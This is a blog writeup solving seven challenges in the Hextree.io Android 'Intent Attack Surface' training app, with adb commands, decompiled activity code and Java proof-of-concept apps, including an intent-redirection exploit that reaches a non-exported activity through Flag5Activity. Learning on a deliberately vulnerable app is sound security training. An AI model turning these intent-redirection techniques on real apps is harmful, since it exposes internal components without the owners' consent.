---
title: "Hextree.io Intent Attack Writeup Part 1"
published: 2025-02-03
description: "This writeup details the steps taken to solve Hextree.io Intent Attack Surface APK"
image: "https://pbs.twimg.com/profile_images/1657684082506039296/fbxkGlEX_400x400.png"
tags: ["android", "pentest","cybersecurity","hextree.io","writeup","APK"]
category: Writeups
lang: "en,ar"
draft: false
---
# ( بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ )
:::caution
 #FreePalastine
:::
# Introduction
In this noob writeup we will explore the world of activities and intents, we will solve 7 challenges with 7 different flags and 7 different topics. We will be focusing on activities from Flag1 to Flag7. Enjoy!
:::warning 
I am a noob android guy, if you find any mistake pls ignore, or maybe report it?  
:::

## Some Definitions Before We Start

### What is an Activity?

*"An activity is a single, focused thing that the user can do. Almost all activities interact with the user, so the Activity class takes care of creating a window for you in which you can place your UI."*

So an activity is what you mostly see on your screen, it can be the main app activity, a login activity, a note taking activity.

### What is an Intent?

*"Declaring an intention to do something, and letting Android figure out the app that can handle it."*

So to start an activity, you need to create an **intent**.

### Our Attack Surface?

The primary attack surface in this context is the `getIntent()` method. This feature is used to pass data to other apps, making it a major attack surface for potential vulnerabilities.

with that being said, lets start! 

---

# Flag1Activity

```java
<activity
    android:name="io.hextree.attacksurface.activities.Flag1Activity"
    android:exported="true"/>
<activity>

```

The first thing to notice is that the activity is set to `exported="true"`, which means it can be called from outside the app.

```java
protected void onCreate(Bundle bundle) {
    super.onCreate(bundle);
    this.f = new LogHelper(this);
    this.f.addTag("basic-main-activity-avd2");
    success(this);
}
```

This is a simple activity. When created (or called), it will add a tag and invoke the `success()` method.

Since this does not require a Proof of Concept (POC) app, I will keep it simple and use `adb am` to trigger the activity.

Run the following command to check the logcat:

```bash
adb logcat --pid=$(adb shell pidof -s io.hextree.attacksurface)
```

Now, execute this command to start the activity:

```bash
adb shell am start -n io.hextree.attacksurface/.activities.Flag1Activity
```

- `start`: Starts the activity.
- `n`: Specifies the component name.
- `io.hextree.attacksurface`: Package name.
- `.activities.Flag1Activity`: Component name.

You can also write it like this:

```bash
io.hextree.attacksurface/io.hextree.attacksurface.activities.Flag1Activity
```

However, I prefer to keep it concise. Now, check your app or logcat to see if the `success()` method was called, and you should receive the flag!

```bash
03-01 15:00:31.749  3417  3417 I Flag1   : success() called!
03-01 15:00:31.766  3417  3417 I Flag1   : HXT{xxxxxxx}
```

---

# Flag2Activity

```java
<activity
    android:name="io.hextree.attacksurface.activities.Flag2Activity"
    android:exported="true">
    <intent-filter>
        <action android:name="io.hextree.action.GIVE_FLAG"/>
    </intent-filter>
</activity>
```

This one is different. We have an `intent-filter` with an action name, which means the activity is also implicitly exported.

```java
protected void onCreate(Bundle bundle) {
    super.onCreate(bundle);
    this.f = new LogHelper(this);
    String action = getIntent().getAction();
    if (action == null || !action.equals("io.hextree.action.GIVE_FLAG")) {
        return;
    }
    this.f.addTag(action);
    success(this);
}
```

Here, the activity waits for an intent using `getIntent()` and checks if the action is either `null` or **NOT** equal to `io.hextree.action.GIVE_FLAG`.

- If the condition is `true`, it returns nothing.
- If the condition is `false`, it calls the `success()` method.

Again, we can use the `adb` command to trigger this activity:

```bash
adb shell am start -n io.hextree.attacksurface/.activities.Flag2Activity -a io.hextree.action.GIVE_FLAG
```

- `a`: Specifies the action name.

```bash
03-01 15:11:08.432  3417  3417 I Flag2   : success() called!
03-01 15:11:08.442  3417  3417 I Flag2   : HXT{xxxxxx}
```

---

# Flag3Activity

```java
<activity
    android:name="io.hextree.attacksurface.activities.Flag3Activity"
    android:exported="true">
    <intent-filter>
        <action android:name="io.hextree.action.GIVE_FLAG"/>
        <data android:scheme="https"/>
    </intent-filter>
</activity>
```

This is similar to **Flag2Activity**, but there’s an additional `<data>` element with the `scheme` attribute set to `https`. Let’s explore what this means by examining the activity itself.

```java
protected void onCreate(Bundle bundle) {
    super.onCreate(bundle);
    this.f = new LogHelper(this);
    Intent intent = getIntent();
    String action = intent.getAction();
    if (action == null || !action.equals("io.hextree.action.GIVE_FLAG")) {
        return;
    }
    this.f.addTag(action);
    Uri data = intent.getData();
    if (data == null || !data.toString().equals("<https://app.hextree.io/map/android>")) {
        return;
    }
    this.f.addTag(data);
    success(this);
}
```

As you can see, it waits for the same action as **Flag2Activity**. However, if the condition is `false`, it also checks the `Uri` data to ensure it matches `https://app.hextree.io/map/android` (remember the `scheme`?).

- If the data is `null` or **NOT** equal to the specified URI, it returns nothing.
- If the data matches, it calls the `success()` method.

To trigger this activity, we’ll use the `adb` command again:

```bash
adb shell am start -n io.hextree.attacksurface/.activities.Flag3Activity -a io.hextree.action.GIVE_FLAG -d https://app.hextree.io/map/android
```

- `d`: Specifies the data URI.

```bash
03-01 15:18:03.264  3417  3417 I Flag3   : success() called!
03-01 15:18:03.273  3417  3417 I Flag3   : HXT{xxxxx}
```

---

# Flag4Activity

Now things are getting more interesting! This activity introduces some complexity and requires deeper research. Let’s dive in.

```java
<activity
    android:name="io.hextree.attacksurface.activities.Flag4Activity"
    android:exported="true"/>
<activity>

```

At first glance, this is just a normal explicitly exported activity. Let’s dig deeper.

```java
public enum State {
    INIT(0),
    PREPARE(1),
    BUILD(2),
    GET_FLAG(3),
    REVERT(4);

    private final int value;

    State(int i) {
        this.value = i;
    }

    public int getValue() {
        return this.value;
    }

    public static State fromInt(int i) {
        for (State state : values()) {
            if (state.getValue() == i) {
                return state;
            }
        }
        return INIT;
    }
}

```
:::important 
Only Engineers will get it (kidding)
:::
The first thing that came to my mind when I saw this was **state machines**. If you’re familiar with state machines, you’ll know they define a flow that determines the current state, the next state, and the actions associated with each state.

Going deeper, we find the main function (I assume) called `stateMachine`:

```java
public void stateMachine(Intent intent) {
    String action = intent.getAction();
    int ordinal = getCurrentState().ordinal();
    if (ordinal != 0) {
        if (ordinal != 1) {
            if (ordinal != 2) {
                if (ordinal == 3) {
                    this.f.addTag(State.GET_FLAG);
                    setCurrentState(State.INIT);
                    success(this);
                    Log.i("Flag4StateMachine", "solved");
                    return;
                }
                if (ordinal == 4 && "INIT_ACTION".equals(action)) {
                    setCurrentState(State.INIT);
                    Toast.makeText(this, "Transitioned from REVERT to INIT", 0).show();
                    Log.i("Flag4StateMachine", "Transitioned from REVERT to INIT");
                    return;
                }
            } else if ("GET_FLAG_ACTION".equals(action)) {
                setCurrentState(State.GET_FLAG);
                Toast.makeText(this, "Transitioned from BUILD to GET_FLAG", 0).show();
                Log.i("Flag4StateMachine", "Transitioned from BUILD to GET_FLAG");
                return;
            }
        } else if ("BUILD_ACTION".equals(action)) {
            setCurrentState(State.BUILD);
            Toast.makeText(this, "Transitioned from PREPARE to BUILD", 0).show();
            Log.i("Flag4StateMachine", "Transitioned from PREPARE to BUILD");
            return;
        }
    } else if ("PREPARE_ACTION".equals(action)) {
        setCurrentState(State.PREPARE);
        Toast.makeText(this, "Transitioned from INIT to PREPARE", 0).show();
        Log.i("Flag4StateMachine", "Transitioned from INIT to PREPARE");
        return;
    }
    Toast.makeText(this, "Unknown state. Transitioned to INIT", 0).show();
    Log.i("Flag4StateMachine", "Unknown state. Transitioned to INIT");
    setCurrentState(State.INIT);
}
```

If you’re a good `script kiddie`, you’ll recognize that this is just a series of nested conditions. To trigger the desired behavior, we need to call the actions in the correct order.

You could do this with a Proof of Concept (POC) app using Android Studio, but I managed to achieve it using the `am` manager, which simplifies things. Here’s how:

We need to start from the topmost action and proceed in the following order:

1. `PREPARE_ACTION`
2. `BUILD_ACTION`
3. `GET_FLAG_ACTION`
4. `INIT_ACTION`

:::caution
**The order is crucial!** Missing the order will cause the process to fail.
:::

```bash
adb shell am start -n io.hextree.attacksurface/.activities.Flag4Activity -a PREPARE_ACTION; \
adb shell am start -n io.hextree.attacksurface/.activities.Flag4Activity -a BUILD_ACTION; \
adb shell am start -n io.hextree.attacksurface/.activities.Flag4Activity -a GET_FLAG_ACTION; \
adb shell am start -n io.hextree.attacksurface/.activities.Flag4Activity -a INIT_ACTION

```

:::tip
If this block of commands doesn’t work, try running them one at a time.
:::

```bash
03-01 15:34:17.535  3570  3570 I Flag4   : success() called!
03-01 15:34:17.546  3570  3570 I Flag4   : HXT{xxxxxxxxxxxxxxx}
```

---

# Flag5Activity

From this point onward, we’ll stop using the `adb` manager and start writing some Proof of Concept (POC) apps using Android Studio.

```java
<activity
    android:name="io.hextree.attacksurface.activities.Flag5Activity"
    android:exported="true"/>
<activity>
```

The activity is explicitly exported. Let’s dive deeper into its implementation.

```java
protected void onCreate(Bundle bundle) {
    super.onCreate(bundle);
    this.f = new LogHelper(this);
    Intent intent = getIntent();
    Intent intent2 = (Intent) intent.getParcelableExtra("android.intent.extra.INTENT");
    if (intent2 == null || intent2.getIntExtra("return", -1) != 42) {
        return;
    }
    this.f.addTag(42);
    Intent intent3 = (Intent) intent2.getParcelableExtra("nextIntent");
    this.nextIntent = intent3;
    if (intent3 == null || intent3.getStringExtra("reason") == null) {
        return;
    }
    this.f.addTag("nextIntent");
    if (this.nextIntent.getStringExtra("reason").equals("back")) {
        this.f.addTag(this.nextIntent.getStringExtra("reason"));
        success(this);
    } else if (this.nextIntent.getStringExtra("reason").equals("next")) {
        intent.replaceExtras(new Bundle());
        startActivity(this.nextIntent);
    }
}
```

Okay, what in the world is this? It looks like nested intents rather than nested conditions. An intent inside an intent? I decided to do some research and found this [StackOverflow post](https://stackoverflow.com/questions/13381535/sending-intent-inside-of-another-intent), which helped me construct the POC app. Here’s how it works:

1. **Outer Intent**: The initial intent that starts the Activity. (`intent`)
2. **First Nested Intent**: Extracted from the outer intent using `getParcelableExtra`. (`intent2`)
3. **Second Nested Intent**: Extracted from the first nested intent using `getParcelableExtra`. (`intent3`)

But something caught my attention:

```java
if (this.nextIntent.getStringExtra("reason").equals("back")) {
    this.f.addTag(this.nextIntent.getStringExtra("reason"));
    success(this);
} else if (this.nextIntent.getStringExtra("reason").equals("next")) {
    intent.replaceExtras(new Bundle());
    startActivity(this.nextIntent);
}

```

- If the `reason` equals `"back"`, the `success()` method is called.
- If the `reason` equals `"next"`, it replaces the `startActivity` parameter with the `nextIntent`.

This means we can pass another intent inside it. Keep this in mind, as we’ll revisit it later. For now, since we don’t need it to get `Flag5`, let’s proceed.

Here’s the POC app:

```java
public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Create the innermost intent (intent3)
        Intent intent3 = new Intent();
        intent3.putExtra("reason", "back");

        // Create the middle intent (intent2) and embed intent3
        Intent intent2 = new Intent();
        intent2.putExtra("nextIntent", intent3);
        intent2.putExtra("return", 42);

        // Create the outer intent (intent1) and embed intent2
        Intent intent1 = new Intent();
        intent1.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag5Activity");
        intent1.putExtra("android.intent.extra.INTENT", intent2);

        // Start the activity with the outer intent
        startActivity(intent1);
    }
}
```
:::note
this is only more illustration for noob guys like me, if you already got it then skip.
:::

Still confused? Here’s how I managed to understand it:

- In the target app, `intent2` is extracted from `intent1` like this:
    
    ```java
    Intent intent2 = (Intent) intent.getParcelableExtra("android.intent.extra.INTENT");
    ```
    
- To reverse this in the POC app, we **put** `intent2` inside `intent1`:
    
    ```java
    intent1.putExtra("android.intent.extra.INTENT", intent2);
    ```
    

I hope this makes it clearer when writing your POC app.

```bash
03-01 16:24:14.766  3685  3685 I Flag5   : success() called!
03-01 16:24:14.852  3685  3685 I Flag5   : HXT{xxxxxxxxxxxx}
```

---

# Flag6Activity

```java
<activity
    android:name="io.hextree.attacksurface.activities.Flag6Activity"
    android:exported="false"/>
<activity>
```

Oops! This activity is **not exported**. How can we call it if it’s not exported? Is this a dead end?

Well, not necessarily. Remember this part from **Flag5Activity**?

```java
if (this.nextIntent.getStringExtra("reason").equals("back")) {
    this.f.addTag(this.nextIntent.getStringExtra("reason"));
    success(this);
} else if (this.nextIntent.getStringExtra("reason").equals("next")) {
    intent.replaceExtras(new Bundle());
    startActivity(this.nextIntent);
}
```

What if we could abuse `startActivity(this.nextIntent);` and place our intent inside it to target **Flag6Activity**? This means we could potentially start **Flag6Activity** indirectly. Let’s first examine **Flag6Activity**:

```java
protected void onCreate(Bundle bundle) {
    super.onCreate(bundle);
    this.f = new LogHelper(this);
    if ((getIntent().getFlags() & 1) != 0) {
        this.f.addTag("FLAG_GRANT_READ_URI_PERMISSION");
        success(this);
    }
}
```

As you can see, it’s a simple activity that waits for the `FLAG_GRANT_READ_URI_PERMISSION` flag to call the `success()` method. This means we can reuse the POC app from **Flag5Activity** with a slight modification to achieve our goal.

This is called Intent Redirection, I recommend reading this blog by Anas 
https://medium.com/@0x3adly/android-intent-redirection-a-hackers-gateway-to-internal-components-ebe126bbb2e0

Here’s the updated POC app:

```java
public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Create the innermost intent (intent3)
        Intent intent3 = new Intent();
        intent3.putExtra("reason", "next"); // Set reason to "next" to trigger startActivity
        intent3.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag6Activity");
        intent3.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION); // Add the required flag

        // Create the middle intent (intent2) and embed intent3
        Intent intent2 = new Intent();
        intent2.putExtra("nextIntent", intent3);
        intent2.putExtra("return", 42);

        // Create the outer intent (intent1) and embed intent2
        Intent intent1 = new Intent();
        intent1.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag5Activity");
        intent1.putExtra("android.intent.extra.INTENT", intent2);

        // Start the activity with the outer intent
        startActivity(intent1);
    }
}
```

Can you spot the difference? Here’s the key part:

```java
Intent intent3 = new Intent();
intent3.putExtra("reason", "next"); // Set reason to "next" to trigger startActivity
intent3.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag6Activity");
intent3.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION); // Add the required flag
```

We changed the `reason` to `"next"` so the condition in **Flag5Activity** evaluates to `true`, triggering `startActivity(this.nextIntent)`. Then, we set the target activity to **Flag6Activity** and added the `FLAG_GRANT_READ_URI_PERMISSION` flag.

At first glance, this might seem complicated, but it’s actually quite simple. Think of it as an **SSRF (Server-Side Request Forgery)** web vulnerability. In SSRF, you abuse a service to access internal resources that you wouldn’t normally have access to as an external user. Similarly, here we don’t have direct access to **Flag6Activity** because it’s **NOT** exported. However, by leveraging **Flag5Activity**, we can gain indirect access from the inside. Got it?

```bash
03-01 16:38:44.088  3685  3685 I Flag6   : success() called!
03-01 16:38:44.186  3685  3685 I Flag6   : HXT{xxxxx}
```

In fact, you can modify the script to call **Flag2Activity** as well. Just make sure to add the required action:

```java
Intent intent3 = new Intent();
intent3.putExtra("reason", "next");
intent3.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag2Activity");
intent3.setAction("io.hextree.action.GIVE_FLAG");
// intent3.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION); // Not needed for Flag2Activity
```

Success!

```java
03-01 16:40:26.367  3685  3685 I Flag2   : success() called!
03-01 16:40:26.395  3685  3685 I Flag2   : HXT{xxxxxx}
```

---

# Flag7Activity

Finally, we’ve reached the last one!

```java
<activity
    android:name="io.hextree.attacksurface.activities.Flag7Activity"
    android:exported="true"/>
<activity>

```

Nothing unusual here. Let’s dig deeper into the code.

```java
protected void onCreate(Bundle bundle) {
    super.onCreate(bundle);
    if (this.f == null) {
        this.f = new LogHelper(this);
    }
    String action = getIntent().getAction();
    if (action == null || !action.equals("OPEN")) {
        return;
    }
    this.f.addTag("OPEN");
}

@Override // io.hextree.attacksurface.AppCompactActivity, androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, android.app.Activity
protected void onNewIntent(Intent intent) {
    super.onNewIntent(intent);
    String action = intent.getAction();
    if (action == null || !action.equals("REOPEN")) {
        return;
    }
    this.f.addTag("REOPEN");
    success(this);
}

```

As you can see, this activity uses **instance reusing**. The first time it’s launched, it expects the action `"OPEN"`. The second time, it expects the action `"REOPEN"`. However, if we call this using the `am` manager, wouldn’t it create two separate instances using `onCreate`? How can we trigger `onNewIntent` instead?

This is where **`FLAG_ACTIVITY_SINGLE_TOP`** and the **Activity Lifecycle** come into play. For more details, check out this [Android Activity Lifecycle guide](https://medium.com/@ranjeet123/android-activity-lifecycle-in-detail-eaf2931a1b37).

Here’s how to trigger it using `adb`:

```bash
adb shell am start -n io.hextree.attacksurface/.activities.Flag7Activity -a OPEN; \
adb shell am start -n io.hextree.attacksurface/.activities.Flag7Activity -a REOPEN --activity-single-top

```

### How It Works:

With `FLAG_ACTIVITY_SINGLE_TOP`:

- The existing instance of `Flag7Activity` is reused.
- The `onNewIntent` method is called, which handles the `"REOPEN"` action and triggers `success(this)`.

### Workflow:

1. **First Launch (`OPEN` action)**:
    - `onCreate` is called.
    - The `action` is `"OPEN"`, so `this.f.addTag("OPEN")` is executed.
2. **Reusing the Activity (`REOPEN` action)**:
    - `onNewIntent` is called (because of `FLAG_ACTIVITY_SINGLE_TOP`).
    - The `action` is `"REOPEN"`, so `this.f.addTag("REOPEN")` is executed, and `success(this)` is called.

```bash
03-01 23:22:40.775  3685  3685 I Flag7   : success() called!
03-01 23:22:40.812  3685  3685 I Flag7   : HXT{xxxxxxxxx}

```

---

# Conclusion

So this is it for Part1, we managed to get the first 7 flag for the apk, which was all for the activity part. We will continue digging more in upcoming parts inshalah.
:::tip 
I left some references in the end which I find super usefull, some were already mentioned above, make sure to check them all!
:::
:::important 
If anyone has any question or inquire or even want to contribute, feel free to hit me on any of social, I would love to discuss!
:::

---

# References

**OFCOURSE HEXTREE.IO**
1. **Android Activity Lifecycle**  
   [https://medium.com/@ranjeet123/android-activity-lifecycle-in-detail-eaf2931a1b37](https://medium.com/@ranjeet123/android-activity-lifecycle-in-detail-eaf2931a1b37)

2. **Sending Intent Inside Another Intent**  
   [https://stackoverflow.com/questions/13381535/sending-intent-inside-of-another-intent](https://stackoverflow.com/questions/13381535/sending-intent-inside-of-another-intent)

3. **Android Developer Documentation**  
   [https://developer.android.com/guide/components/activities/intro-activities](https://developer.android.com/guide/components/activities/intro-activities)

4. **Intent Redirection**  
   [https://medium.com/@0x3adly/android-intent-redirection-a-hackers-gateway-to-internal-components-ebe126bbb2e0](https://medium.com/@0x3adly/android-intent-redirection-a-hackers-gateway-to-internal-components-ebe126bbb2e0)

5. **pwny.cc**  
   [https://www.pwny.cc/so/android/intent](https://www.pwny.cc/so/android/intent)

---
